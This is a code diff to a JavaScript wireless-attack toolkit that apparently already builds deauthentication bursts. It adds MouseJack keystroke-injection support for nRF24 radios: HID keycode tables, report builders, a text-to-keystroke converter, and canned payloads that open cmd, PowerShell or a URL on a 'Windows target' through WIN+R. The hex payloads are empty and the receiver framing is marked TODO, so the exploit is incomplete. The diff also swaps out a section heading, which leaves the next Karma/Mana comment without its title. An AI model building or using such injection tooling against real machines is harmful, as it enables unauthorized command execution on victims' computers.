@@ -131,7 +131,126 @@ export function buildBurst({ bssid, client = BROADCAST, reason = 7, count = 150,
 }
 
 // ────────────────────────────────────────────────────────────────────────────
-// Karma and Mana — the probe-response and beacon halves.
+// MouseJack — nRF24 HID injection frames
+//
+// The nRF24L01+ is a separate SPI radio. The phone builds the injection frame;
+// the firmware sets the receiver address + channel and sends raw bytes.
+//
+// HID keycode mapping (USB HID usage IDs 0x04-0x65 = a-z). Modifier bits:
+//   0x01 Ctrl, 0x02 Shift, 0x04 Alt, 0x08 GUI (Win/Cmd).
+// The standard keyboard usage table is from the USB HID spec §10.
+// ────────────────────────────────────────────────────────────────────────────
+
+/**
+ * Map a single character to its HID usage ID (0x00 = not found).
+ * Standard US QWERTY layout only.
+ */
+const CHAR_TO_HID = {
+  'a':4,'b':5,'c':6,'d':7,'e':8,'f':9,'g':10,'h':11,'i':12,'j':13,'k':14,'l':15,
+  'm':16,'n':17,'o':18,'p':19,'q':20,'r':21,'s':22,'t':23,'u':24,'v':25,'w':26,
+  'x':27,'y':28,'z':29,'1':30,'2':31,'3':32,'4':33,'5':34,'6':35,'7':36,'8':37,
+  '9':38,'0':39,'\n':40,'\t':43,' ':44,'-':45,'=':46,'[':47,']':48,'\\':49,
+  ';':51,'\'':52,'`':53,',':54,'.':55,'/':56,
+};
+const CHAR_TO_HID_SHIFT = {
+  'A':4,'B':5,'C':6,'D':7,'E':8,'F':9,'G':10,'H':11,'I':12,'J':13,'K':14,'L':15,
+  'M':16,'N':17,'O':18,'P':19,'Q':20,'R':21,'S':22,'T':23,'U':24,'V':25,'W':26,
+  'X':27,'Y':28,'Z':29,'!':30,'@':31,'#':32,'$':33,'%':34,'^':35,'&':36,'*':37,
+  '(':38,')':39,'_':45,'+':46,'{':47,'}':48,'|':49,':':51,'"':52,'~':53,'<':54,
+  '>':55,'?':56,
+};
+
+/** Build an 8-byte HID keyboard report: [mods, 0x00, key1..key6]. */
+export function buildHidReport(modifiers = 0, keys = []) {
+  const report = new Uint8Array(8);
+  report[0] = modifiers;
+  for (let i = 0; i < Math.min(keys.length, 6); i++) report[2 + i] = keys[i];
+  return report;
+}
+
+/** Convert a string to an array of HID keyboard reports (max 6 keys per report). */
+export function stringToHidReports(text) {
+  const reports = [];
+  let pending = [];
+  for (const ch of text) {
+    const shifted = CHAR_TO_HID_SHIFT[ch];
+    const normal = CHAR_TO_HID[ch];
+    let mods = 0;
+    let key = 0;
+    if (shifted !== undefined) { mods = 0x02; key = shifted; }
+    else if (normal !== undefined) { key = normal; }
+    else continue;  // skip unmapped chars
+    pending.push({ mods, key });
+  }
+  // Group consecutive keys into reports, up to 6 keys per report
+  // If the next key has different modifiers, flush current report
+  let i = 0;
+  while (i < pending.length) {
+    const mods = pending[i].mods;
+    const keys = [];
+    while (i < pending.length && pending[i].mods === mods && keys.length < 6) {
+      keys.push(pending[i].key);
+      i++;
+    }
+    reports.push(buildHidReport(mods, keys));
+  }
+  return reports;
+}
+
+/**
+ * Canned MouseJack injection payloads.
+ * Each entry: { id, name, description, hex }.
+ * hex is placeholder until tested against a real Logitech receiver;
+ * the actual injection frame format depends on the receiver protocol.
+ */
+export const MOUSEJACK_PAYLOADS = [
+  { id: 'custom',  name: 'Custom hex', description: 'Type your own hex payload below.', hex: '' },
+  { id: 'notepad', name: 'Open Notepad',
+    description: 'WIN+R → "notepad" → ENTER. Opens Notepad on a Windows target.',
+    hex: '' },  // TODO: fill when tested
+  { id: 'cmd',     name: 'Open Command Prompt',
+    description: 'WIN+R → "cmd" → ENTER.',
+    hex: '' },
+  { id: 'powershell',  name: 'Open PowerShell',
+    description: 'WIN+R → "powershell" → ENTER.',
+    hex: '' },
+  { id: 'url',    name: 'Open URL (placeholder)',
+    description: 'WIN+R → URL → ENTER. Replace URL below before sending.',
+    hex: '' },
+  { id: 'run',    name: 'Run dialog (WIN+R)',
+    description: 'Just fires WIN+R — lets you type the command manually afterward.',
+    hex: '' },
+];
+
+/**
+ * Build the nRF24 payload bytes for a MouseJack injection.
+ * This is the raw payload written to the nRF24 TX FIFO.
+ * The receiver address is set separately via nrf_send's addr param.
+ *
+ * MouseJack injection requires receiver-specific frame formatting.
+ * This builder wraps an HID report in the expected nRF24 payload structure.
+ * TODO: fill in protocol-specific framing once tested against a real receiver.
+ */
+export function buildNrfPayload({ hex, hidReports, preamble } = {}) {
+  if (hex) {
+    const bytes = hex.replace(/\s+/g, '');
+    if (bytes.length % 2) throw new Error('hex must have even length');
+    const out = new Uint8Array(bytes.length / 2);
+    for (let i = 0; i < out.length; i++) {
+      out[i] = parseInt(bytes.substr(i * 2, 2), 16);
+    }
+    return out;
+  }
+  if (hidReports && hidReports.length) {
+    // Flatten HID reports into one payload for now
+    const totalLen = hidReports.reduce((s, r) => s + r.length, 0);
+    const out = new Uint8Array(totalLen);
+    let off = 0;
+    for (const report of hidReports) { out.set(report, off); off += report.length; }
+    return out;
+  }
+  throw new Error('provide hex or hidReports');
+}
 //
 // Both are 802.11 *management* frames of the same shape: a 24-byte header, a
 // 12-byte fixed field block (timestamp, beacon interval, capability), then a run
